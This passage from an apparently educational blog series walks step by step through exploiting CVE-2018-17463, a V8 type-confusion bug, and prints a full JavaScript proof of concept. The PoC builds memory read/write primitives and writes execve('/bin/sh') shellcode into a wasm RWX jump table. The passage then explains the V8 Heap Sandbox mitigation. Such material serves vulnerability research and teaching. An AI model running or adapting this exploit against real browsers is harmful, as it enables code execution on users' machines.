class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);
<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);
<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);
<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;</code></pre>
<h3 id="3-Leak-the-RWX-jump-table-pointer"><a href="#3-Leak-the-RWX-jump-table-pointer" class="headerlink" title="[3] Leak the RWX jump-table pointer"></a>[3] Leak the RWX jump-table pointer</h3><p>Using our primitive, obtain the wasm instance&#x2019;s address and the jump-table start pointer.</p>
<pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>
print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);
<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);
print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);
<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);
print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);</code></pre>
<h3 id="4-Inject-shellcode"><a href="#4-Inject-shellcode" class="headerlink" title="[4] Inject shellcode"></a>[4] Inject shellcode</h3><p>Read the jump-table pointer at offset <code>0xf0</code> from the <code>wasmInstance</code> object to obtain the RWX address. Use <code>read64</code> to get the executable address, then write your shellcode there.</p>
<pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>
print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);
<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);
print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);
<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);
print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);

print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);
<span class="hljs-comment">// Prepare Calc Shellcode</span>
<span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0x48</span>,...

print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);
<span class="hljs-comment">// Write Shellcode to Jump Table Start Address</span>
memory.write(wasmRWXAddr, shellcode);</code></pre>
<h3 id="5-Call-the-wasm-function-to-execute-the-shellcode"><a href="#5-Call-the-wasm-function-to-execute-the-shellcode" class="headerlink" title="[5] Call the wasm function to execute the shellcode"></a>[5] Call the wasm function to execute the shellcode</h3><p>Finally, call the wasm function (<code>main</code>). Since the jump table now points to our shellcode, invoking the function will execute it.</p>
<pre><code class="hljs jsx"><span class="hljs-comment">// Execute our Shellcode</span>
print(<span class="hljs-string">&quot;[+] Popping Calc...&quot;</span>);
func();</code></pre>
<p>This completes the chain from a JavaScript-initiated bug to native code execution.</p>
<p>Below is the final PoC reflecting the above steps.</p>
<blockquote>
<p>As mentioned in Part 1, these tests were performed on Linux. To port the PoC from Windows to Linux you only need to change the shellcode. I replaced the Windows calc shellcode with a shell-launching shellcode and executed it on Linux.</p>
</blockquote>
<pre><code class="hljs jsx"><span class="hljs-comment">// Conversion Buffers</span>
<span class="hljs-keyword">let</span> floatView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);
<span class="hljs-keyword">let</span> uint64View = <span class="hljs-keyword">new</span> BigUint64Array(floatView.buffer);

<span class="hljs-built_in">Number</span>.prototype.toBigInt = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toBigInt</span>(<span class="hljs-params"></span>) </span>{
    floatView[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;
    <span class="hljs-keyword">return</span> uint64View[<span class="hljs-number">0</span>];
};

BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{
    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;
    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];
};

<span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeObj</span>(<span class="hljs-params">pValues</span>) </span>{
    <span class="hljs-keyword">let</span> obj = {
        inline: <span class="hljs-number">1234</span>
    };
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {
            writable: <span class="hljs-literal">true</span>,
            value: pValues[i]
        });
    }
    <span class="hljs-keyword">return</span> obj;
}

<span class="hljs-comment">// Function to find overlapping properties</span>
<span class="hljs-keyword">let</span> p1, p2;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findOverlappingProperties</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">let</span> pNames = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;
    }

    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">        function vuln(obj) {</span>
<span class="hljs-string">            obj.inline;</span>
<span class="hljs-string">            this.Object.create(obj);</span>
<span class="hljs-string">            <span class="hljs-subst">${pNames.map((p) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${p}</span> = obj.<span class="hljs-subst">${p}</span>;`</span>).join(<span class="hljs-string">&apos;\n&apos;</span>)}</span></span>
<span class="hljs-string">            return [<span class="hljs-subst">${pNames.join(<span class="hljs-string">&apos;, &apos;</span>)}</span>];</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    `</span>);

    <span class="hljs-keyword">let</span> pValues = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        pValues[i] = -i;
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {
            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {
                [p1, p2] = [i, -res[i]];
                <span class="hljs-keyword">return</span>;
            }
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;
}

<span class="hljs-comment">// Return address of an object as a BigInt</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">        function vuln(obj) {</span>
<span class="hljs-string">            obj.inline;</span>
<span class="hljs-string">            this.Object.create(obj);</span>
<span class="hljs-string">            return obj.p<span class="hljs-subst">${p1}</span>.x1;</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    `</span>);

    <span class="hljs-keyword">let</span> pValues = [];
    pValues[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };
    pValues[p2] = { <span class="hljs-attr">y</span>: obj };

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>;
}

<span class="hljs-comment">// Function to write data to obj address</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">        function vuln(obj) {</span>
<span class="hljs-string">            obj.inline;</span>
<span class="hljs-string">            this.Object.create(obj);</span>
<span class="hljs-string">            let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span>
<span class="hljs-string">            obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span>
<span class="hljs-string">            return orig;</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    `</span>);

    <span class="hljs-keyword">let</span> pValues = [];
    <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };
    pValues[p1] = o;
    pValues[p2] = obj;

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        o.x2 = <span class="hljs-number">13.38</span>;
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {
            <span class="hljs-keyword">return</span> res.toBigInt();
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>;
}

<span class="hljs-comment">// Find Overlapping Properties</span>
print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);
findOverlappingProperties();
print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);

<span class="hljs-comment">// Create Array Buffers</span>
<span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);
<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);

<span class="hljs-comment">// Leak Address of arrBuf2</span>
print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);
<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);
print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);

<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1</span>
print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>);
<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span>
<span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1);
<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>];

<span class="hljs-comment">// Memory Read and Write Primitives</span>
<span class="hljs-keyword">let</span> memory = {
    write(addr, bytes) {
        view1[<span class="hljs-number">4</span>] = addr;
        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);
        view2.set(bytes);
    },
    read64(addr) {
        view1[<span class="hljs-number">4</span>] = addr;
        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);
        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];
    },
    write64(addr, ptr) {
        view1[<span class="hljs-number">4</span>] = addr;
        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);
        view2[<span class="hljs-number">0</span>] = ptr;
    },
    addrOf(obj) {
        arrBuf2.leakMe = obj;
        <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;
    }
};

print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);

<span class="hljs-comment">// Generate RWX region via WASM</span>
print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);
<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);
<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);
<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);
<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;

<span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table</span>
print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);
<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);
print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);
<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);
print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);

print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);
<span class="hljs-comment">// Linux x64 Shellcode to execute /bin/sh</span>
<span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([
    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>,                   <span class="hljs-comment">// push 59 (syscall number for execve)</span>
    <span class="hljs-number">0x58</span>,                         <span class="hljs-comment">// pop rax</span>
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>,            <span class="hljs-comment">// xor rdx, rdx (envp = NULL)</span>
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>,            <span class="hljs-comment">// xor rsi, rsi (argv = NULL)</span>
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// movabs rdi, &quot;/bin/sh\x00&quot;</span>
    <span class="hljs-number">0x57</span>,                         <span class="hljs-comment">// push rdi</span>
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>,            <span class="hljs-comment">// mov rdi, rsp</span>
    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>                    <span class="hljs-comment">// syscall</span>
]);

print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);
<span class="hljs-comment">// Write Shellcode</span>
memory.write(wasmRWXAddr, shellcode);

print(<span class="hljs-string">&quot;[+] Spawning Shell...&quot;</span>);
<span class="hljs-comment">// Execute Shellcode</span>
func();
</code></pre>
<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p>Because this exploit writes shellcode into a wasm instance&#x2019;s jump table in memory, porting the payload to Linux involved only changing the shellcode. I replaced the calc payload with a shell spawner and ran it successfully on Linux.</p>
<ul>
<li>Windows</li>
</ul>
<p><img src="image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
<ul>
<li>Linux</li>
</ul>
<p><img src="image%204.png" srcset="/img/loading.gif" alt="image.png"></p>
<h2 id="1-4-Summary"><a href="#1-4-Summary" class="headerlink" title="1.4 Summary"></a>1.4 Summary</h2><p>We&#x2019;ve now made it to Part 4, and since it&#x2019;s been quite a long journey, let&#x2019;s take a moment to summarize before moving on! (There&#x2019;s still more ahead &#x1F60E;)</p>
<p>In <strong>Part 1</strong>, we covered the foundational concepts necessary to understand Chrome&#x2019;s internal architecture and the V8 engine.</p>
<p>In <strong>Part 2</strong>, we discussed the concept of <strong>Type Confusion</strong> &#x2014; why it happens when the JavaScript engine misinterprets internal types, and what security risks it introduces.</p>
<p>In <strong>Parts 3 through 4 (so far)</strong>, we took a deep dive into how Type Confusion can be leveraged to build <strong>read/write primitives</strong>, and how those primitives evolve into a <strong>full exploit chain</strong>.</p>
<p>Modern browsers operate using multiple processes and complex memory structures to support their wide range of features. This architecture gives attackers numerous potential vectors to target, and by chaining those vectors together, they can gain the ability to read or write arbitrary data in the heap.</p>
<p>This research post focused on one such vector &#x2014; <strong>Type Confusion</strong> &#x2014; showing how it can be exploited to manipulate memory and ultimately achieve <strong>remote code execution (RCE)</strong>.</p>
<p>From a technical standpoint, the exploit for <strong>CVE-2018-17463</strong> can be thought of as consisting of two major phases:</p>
<ol>
<li><strong>Vulnerability &#x2192; Primitive Construction Phase:</strong><br>This phase involves analyzing the Type Confusion bug and crafting reliable <strong>memory read/write primitives</strong>. It&#x2019;s primarily about understanding the root cause of the bug and the inner workings of the JavaScript engine.</li>
<li><strong>Primitive &#x2192; Code Execution (Weaponization / Pwn) Phase:</strong><br>In this phase, the attacker uses the acquired primitives to target <strong>executable memory (RWX)</strong> and run arbitrary code. This step belongs more to the traditional <strong>pwnable/exploit engineering</strong> domain.</li>
</ol>
<p>In other words, when viewed through the lens of <strong>CVE-2018-17463</strong>, everything up to the creation of the memory read/write primitives belongs to <strong>vulnerability and engine-level research</strong>, while overwriting the <strong>Wasm instance jump table</strong> to trigger actual RCE falls under <strong>pwnable exploitation</strong>.</p>
<p>Now, if you&#x2019;ve studied pwnable before, you might already know what usually follows such an exploit&#x2026;</p>
<p>That&#x2019;s right &#x2014; <strong>mitigation</strong>&#x1F62D;</p>
<p><del>(As someone studying vulnerabilities, I can&#x2019;t decide whether to laugh or cry &#x1F602;)</del></p>
<p>In V8, optimizations that occur independently of the developer&#x2019;s intentions can often lead to bugs like Type Confusion. Because this happened far too frequently, <strong>V8 introduced a new mitigation called the Heap Sandbox in early 2020</strong>.</p>
<p>Let&#x2019;s continue and explore what <strong>Heap Sandbox</strong> is, and how it mitigates these attacks! &#x314E;.&#x314E;</p>
<h1 id="2-V8-Heap-Sandbox"><a href="#2-V8-Heap-Sandbox" class="headerlink" title="2. V8 Heap Sandbox"></a>2. V8 Heap Sandbox</h1><p>In Chapter 2, &#x201C;sandbox&#x201D; doesn&#x2019;t mean Chrome&#x2019;s process sandbox but rather the heap sandbox inside the renderer &#x2014; i.e., the V8 heap sandbox.</p>
<h2 id="2-1-Motivation"><a href="#2-1-Motivation" class="headerlink" title="2.1 Motivation"></a>2.1 Motivation</h2><p><img src="image%205.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>For several years before the sandbox, over 60% of Chrome exploits started in V8, but many of those weren&#x2019;t classic memory bugs (UAF, OOB). They were subtle logical bugs in the JIT compiler or runtime &#x2014; or memory corruptions caused by such logic bugs. These aren&#x2019;t problems you can eliminate just by writing &#x201C;better&#x201D; code, because the compiler itself becomes an attack surface. V8 therefore needed a tailored defensive layer that prevents memory corruption in the heap from immediately compromising the rest of the process &#x2014; that is the core goal of the <strong>V8 Heap Sandbox</strong>.</p>
<p>Put it simply, the goal is to ensure that <strong>even if a vulnerability causes an arbitrary value (especially a pointer) to be written, that value cannot immediately take over the engine&#x2019;s control flow</strong>. Like any security feature, the sandbox must keep overhead low. To achieve this, the Heap Sandbox generally follows these conceptual strategies:</p>
<ul>
<li><strong>Memory partitioning / isolation:</strong> separate the engine heap memory (and related structures) from other runtime memory (host address space, JIT code pages, etc.) so that a heap value cannot directly translate into an external executable address.</li>
<li><strong>Pointer encapsulation &amp; validation:</strong> encode (tag) pointer representations stored on the heap or validate pointers before they are used, preventing heap values from being mixed directly with host addresses.</li>
<li><strong>Restricted dereferencing / bounds checks:</strong> strictly distinguish whether a heap value is an executable code address and prevent interpreting arbitrary data as function pointers.</li>
</ul>
<p>Overall, V8&#x2019;s sandbox design focuses on protecting the rest of the process under the assumption that an attacker may be able to corrupt heap memory.</p>
<h2 id="2-2-Implementation"><a href="#2-2-Implementation" class="headerlink" title="2.2 Implementation"></a>2.2 Implementation</h2><p>The key idea in the sandbox design is to change how V8 dereferences addresses: instead of doing direct pointer arithmetic inside the engine, treat heap <strong>references as offsets/indices</strong>. This prevents raw heap values from becoming host addresses or executable pointers, and lets the runtime control pointer usage tightly. The high-level concept can be broken down as follows.</p>
<p><img src="image%206.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>This concept can be divided into &#x201C;sandbox address-space allocation / handling of pointers inside &amp; outside the sandbox / trusted space,&#x201D; and we&#x2019;ll take a closer look at each of those in detail.</p>
<h3 id="1-Sandbox-Address-Space"><a href="#1-Sandbox-Address-Space" class="headerlink" title="1. Sandbox Address Space"></a>1. Sandbox Address Space</h3><p>The sandbox reserves a <strong>large virtual address space</strong> that contains the memory V8 directly touches (engine heap, ArrayBuffer backing stores, Wasm memory, etc.). This space is reserved in virtual address space (potentially terabytes) and treated as the &#x201C;sandbox.&#x201D; Generous guard regions surround the sandbox to prevent out-of-bounds sandbox indices from escaping into the host address space, both logically and physically.</p>
<p><img src="image%207.png" srcset="/img/loading.gif" alt="image.png"></p>
<h3 id="2-Sandboxed-Pointers-pointers-inside-the-sandbox"><a href="#2-Sandboxed-Pointers-pointers-inside-the-sandbox" class="headerlink" title="2. Sandboxed Pointers (pointers inside the sandbox )"></a>2. Sandboxed Pointers (pointers inside the sandbox )</h3><p>References inside the sandbox are represented not as raw physical addresses but as <strong>offsets from the sandbox base</strong>. A SandboxedPointer uses a fixed-width offset (for example, 40 bits) relative to the sandbox base, so even if the offset value is corrupted, the resulting address remains inside the sandbox. Security-wise this blocks arbitrary access outside the sandbox; performance-wise it&#x2019;s efficient because the sandbox base can be cached in a CPU register and offset&#x2192;address conversion on x86-64 requires only two extra instructions (and one on ARM64).</p>
<h3 id="3-Pointer-Tables-pointers-outside-the-sandbox"><a href="#3-Pointer-Tables-pointers-outside-the-sandbox" class="headerlink" title="3. Pointer Tables (pointers outside the sandbox )"></a>3. Pointer Tables (pointers outside the sandbox )</h3><p>Objects outside the sandbox (e.g., DOM nodes, external extension objects) are not referenced directly from within the sandbox. Instead, the sandbox stores <strong>indices into a pointer table</strong>. Sandboxed objects hold a table index rather than the external pointer itself; at runtime the sandbox resolves that index to an external pointer. This improves safety: spatial safety is enforced by bounds-checking table indices; temporal safety is improved because GC can manage and reclaim table entries. Table entries can also include <strong>type tags</strong> so that when a pointer is loaded it can be validated against an expected type &#x2014; helping prevent Type Confusion attacks.</p>
<p><img src="image%208.png" srcset="/img/loading.gif" alt="image.png"></p>
<h3 id="4-Trusted-Space"><a href="#4-Trusted-Space" class="headerlink" title="4. Trusted Space"></a>4. Trusted Space</h3><p>Certain internal V8 objects (for example, bytecode arrays, deoptimization data) are difficult to protect solely with the sandbox or could be risky if mishandled. V8 therefore puts especially sensitive objects into a separate <strong>trusted heap area</strong> outside the sandbox. This trusted area has its own pointer-compression cage and is accessed from the sandbox via an indirection mechanism (e.g., a Trusted Pointer Table). As a result, even if an attacker corrupts data inside the sandbox, the chances of directly manipulating sensitive trusted objects are greatly reduced.</p>
<p><img src="image%209.png" srcset="/img/loading.gif" alt="image.png"></p>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In short, the sandbox architecture: (1) isolates the heap into a large virtual address region, (2) represents pointers inside the sandbox as safe offsets, (3) uses index-based tables for references to outside-the-sandbox objects, and (4) isolates especially sensitive objects into a trusted space. This multi-layered approach effectively blocks heap-based vulnerabilities from immediately turning into execution control compromises.</p>
<p><img src="image%2010.png" srcset="/img/loading.gif" alt="image.png"></p>
<h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p>Before the sandbox, simply overwriting a heap pointer so that a <code>TypedArray</code>&#x2019;s <code>backing_store</code> pointed at attacker-chosen memory was often enough to get arbitrary read/write (AAR/AAW) across process memory.</p>
<p>With the sandbox, the difficulty of Chrome exploitation increased dramatically. The most direct effect is that pointer overwrite attacks are harder: the sandbox stops simple pointer casting or ensures that a corrupted value won&#x2019;t be treated as a valid execution pointer. As a result, achieving a renderer-process RCE from a single vulnerability typically requires a <strong>sandbox escape</strong>.</p>
<p>But raising the difficulty only goes so far &#x2014; if you can escape the sandbox&#x2026;?</p>
<p><img src="image%2011.jpg" srcset="/img/loading.gif" alt="image.jpg"></p>
<p>In the next post I&#x2019;ll cover how renderer RCE is achieved after the sandbox was introduced.</p>
<p>See you next time! &#x1F64C;</p>
